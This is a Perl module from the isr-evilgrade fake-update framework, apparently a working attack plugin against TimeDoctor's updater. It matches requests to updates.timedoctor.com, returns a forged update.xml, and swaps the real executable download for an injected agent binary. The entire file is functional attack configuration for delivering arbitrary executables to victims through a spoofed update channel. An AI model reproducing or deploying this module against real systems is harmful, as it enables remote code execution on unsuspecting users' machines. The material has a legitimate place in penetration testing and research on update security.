###############
# timedoctor.pm
#
# Copyright 2010 Francisco Amato
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.
#
# isr-evilgrade is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with isr-evilgrade; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#
# '''
##
package modules::timedoctor;

use strict;
use Data::Dump qw(dump);

my $base = {
    'name'    => 'timedoctor',
    'version' => '1.2',
    'appver'  => 'tdlite <= 2.3.46.6, tdpro <= 1.4.72.6',
    'author'  => [
        'Fernando Munoz <fernando +[AT]+ null-life.com>',
        'Daniel Correa <daniel +[AT]+ null-life.com'
    ],
    'description' => qq{},
    'vh'          => '(updates.timedoctor.com|myserver.timedoctor.com)',
    'request'     => [
        {   'req'    => 'windows/update.xml',
            'type'   => 'file',
            'method' => '',
            'bin'    => '0',
            'string' => '',
            'parse'  => '1',
            'file'   => './include/timedoctor/windows.xml',
        },
        {   'req'    => '.exe',
            'type'   => 'agent',
            'method' => '',
            'bin'    => 1,
            'string' => '',
            'parse'  => '0',
            'file'   => ''
        },
    ],

    #Options
    'options' => {
        'agent' => {
            'val'  => './agent/agent.exe',
            'desc' => 'Agent to inject',
        },
        'enable' => {
            'val'  => 1,
            'desc' => 'Status'
        },

    }
};

##########################################################################
# FUNCTION      new
# RECEIVES
# RETURNS
# EXPECTS
# DOES          class's constructor
sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
